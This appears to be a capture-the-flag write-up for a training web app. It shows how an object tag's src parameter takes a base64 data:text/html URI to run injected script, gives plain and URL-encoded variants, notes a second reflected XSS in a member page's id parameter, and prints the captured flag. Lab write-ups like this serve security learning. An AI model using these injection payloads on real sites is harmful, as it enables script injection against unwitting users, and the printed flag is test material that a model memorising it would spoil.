We are on the page "page=media&src=nsa".

We quickly understand that if we put anything in src we come across a new page.
A page with an object that contains a 404: NOt Found.
The object attribute does not have a type and this is good news for exploiting it.

The idea is to send it a string with "<script>alert(1);</script>" converted to base64.

<script>alert(1);</script> -> PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=

And tell him the type:

data:text/html;base64,

Which gives us:

http://<server_ip>/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4

And now we have a flag page:
THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D

While searching for the flag we found two other bonus xss exploit

The first is that we can send to the same page:
data:text/html,<script>alert(1);</script>
or
data:text/html,%3Cscript%3Ealert%28%27hi%27%29%3B%3C%2Fscript%3E
If a parser had blocked us


The second is on the member page:
http://192.168.56.105/index.php?page=member&id=1&Submit=Submit#
The id field is also vulnerable:
http://192.168.56.105/index.php?page=member&id=%3Cscript%3Ealert(1);%3C/script%3E&Submit=Submit#
